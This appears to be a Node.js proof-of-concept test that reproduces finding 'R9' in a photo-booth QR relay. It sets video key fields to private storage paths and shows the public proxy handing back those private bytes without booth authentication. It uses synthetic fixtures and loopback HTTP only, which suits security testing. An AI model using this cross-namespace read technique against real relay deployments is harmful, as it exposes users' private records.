// OPEN R9: requires an authenticated booth and a known target key.
// All objects/credentials are synthetic; uses actual post-auth confirmation and public proxy handlers.
import assert from 'node:assert/strict';
import http from 'node:http';
import { readFile } from 'node:fs/promises';
import { createHash } from 'node:crypto';
import { storage } from '../test/helpers/relay-fixture.mjs';
import { makeQrRelay } from '../test/helpers/qr-relay-fixture.mjs';
const results = [];
const baseline = await readFile(new URL('../../diagnosis-2026-10-30/capturism-main/capturism-relay/server.js', import.meta.url), 'utf8');
for (const [version, code] of [['baseline', baseline], ['candidate', null]]) for (const [field, kind, target] of [
  ['videoKey', 'video', 'subscriptions/synthetic-private.json'],
  ['layoutVideoKey', 'layout', 'quiz-codes/123456.json'],
  ['storyVideoKey', 'story', 'pool/synthetic-private.json'],
]) {
  const options = code ? { code } : {};
  const store = storage(); let relay = makeQrRelay(store, options);
  const signed = await relay.sign({ kind: 'photo', contentType: 'image/jpeg' }); assert.equal(signed.status, 200);
  const { token, key: photoKey } = signed.body;
  store.objects.set(photoKey, Buffer.alloc(32, 7));
  const privateBytes = Buffer.from(JSON.stringify({ synthetic: true, classification: 'private non-media record', namespace: target.split('/')[0] }));
  store.objects.set(target, privateBytes);
  const accepted = await relay.confirm({ token, photoKey, [field]: target }); assert.equal(accepted.status, 200);
  const download = await relay.download(token); assert.equal(download.status, 200);
  const urlField = { video: 'videoUrl', layout: 'layoutVideoUrl', story: 'storyVideoUrl' }[kind];
  assert.ok(download.body[urlField].includes(encodeURIComponent(target)));
  const writes = store.writes;
  const server = http.createServer((req, res) => {
    assert.equal(req.headers['x-booth-auth'], undefined);
    void relay.handleProxyAsset(req, res, token, kind);
  });
  await new Promise(r => server.listen(0, '127.0.0.1', r));
  try {
    const url = `http://127.0.0.1:${server.address().port}/public-proxy`;
    const warm = await fetch(url); assert.equal(warm.status, 200);
    assert.deepEqual(Buffer.from(await warm.arrayBuffer()), privateBytes);
    relay = makeQrRelay(store, options); // Lose every session cache, retain provider objects.
    const cold = await fetch(url); assert.equal(cold.status, 200);
    assert.deepEqual(Buffer.from(await cold.arrayBuffer()), privateBytes);
    assert.equal(store.writes, writes);
    results.push({ version, field, targetNamespace: target.split('/')[0], ownPhotoIdentityIssuedByServer: true,
      postAuthConfirmationStatus: accepted.status, publicProxyStatus: warm.status, restartedPublicProxyStatus: cold.status,
      privateBytesExposed: true, sourceDigest: createHash('sha256').update(privateBytes).digest('hex'),
      proxyRequiredBoothAuth: false, storageChangedByPublicRead: false });
  } finally { server.closeAllConnections(); await new Promise(r => server.close(r)); }
}
console.log(JSON.stringify({ finding: 'R9', interpretation: 'Unsafe cross-namespace read delegation reproduced, not fixed. Synthetic local provider and loopback HTTP only; valid booth authorization is a prerequisite for creating the mapping.', results }, null, 2));
